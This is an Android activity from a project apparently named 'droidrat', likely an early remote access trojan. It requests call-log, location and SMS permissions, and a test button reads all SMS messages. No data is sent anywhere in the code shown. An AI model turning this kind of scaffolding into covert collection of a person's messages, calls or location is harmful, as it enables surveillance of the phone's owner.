package com.je_chen.droidrat_je.activity;

import android.Manifest;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.view.View;
import android.widget.Button;

import androidx.appcompat.app.AppCompatActivity;

import com.google.android.gms.common.api.GoogleApi;
import com.google.android.gms.common.api.GoogleApiClient;
import com.google.android.gms.location.LocationRequest;
import com.je_chen.droidrat_je.R;
import com.je_chen.droidrat_je.appintent.call.Call;
import com.je_chen.droidrat_je.appintent.mail.SendMail;
import com.je_chen.droidrat_je.appintent.web.Web;
import com.je_chen.droidrat_je.appsinfo.checkpermission.PermissionsCheck;
import com.je_chen.droidrat_je.sms.SMS;

public class LaunchActivity extends AppCompatActivity implements View.OnClickListener {

    final String TAG = "JE-TAG";

    private final static int CONNECTION_FAILURE_RESOLUTION_REQUEST = 9000;
    private GoogleApi googleApi;
    private LocationRequest locationRequest;
    private double currentLatitude;
    private double currentLongitude;

    PackageManager packageManager;

    Call call;

    Web web;

    SendMail sendMail;

    SMS sms;

    PermissionsCheck permissionsCheck;


    Button testButton;


    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_lanuch);

        String[] requestPermission = new String[]{
                // PHONE
                Manifest.permission.CALL_PHONE,
                Manifest.permission.READ_CALL_LOG,

                // LOCATION
                Manifest.permission.ACCESS_FINE_LOCATION,
                Manifest.permission.ACCESS_COARSE_LOCATION,

                //SMS
                Manifest.permission.RECEIVE_SMS,
                Manifest.permission.SEND_SMS,
                Manifest.permission.READ_SMS};

        packageManager = getPackageManager();

        call = new Call();
        web = new Web();
        sendMail = new SendMail();
        sms = new SMS();

        permissionsCheck = new PermissionsCheck(packageManager);

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            permissionsCheck.checkPermission(this, requestPermission);
        }

        testButton = findViewById(R.id.testButton);
        testButton.setOnClickListener(this);

    }

    @Override
    protected void onStart() {
        super.onStart();
    }

    @Override
    protected void onResume() {
        super.onResume();
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
    }

    @Override
    public void onClick(View view) {
        switch (view.getId()) {
            case R.id.testButton:
                sms.getAllSms(this);
                break;
        }
    }
}
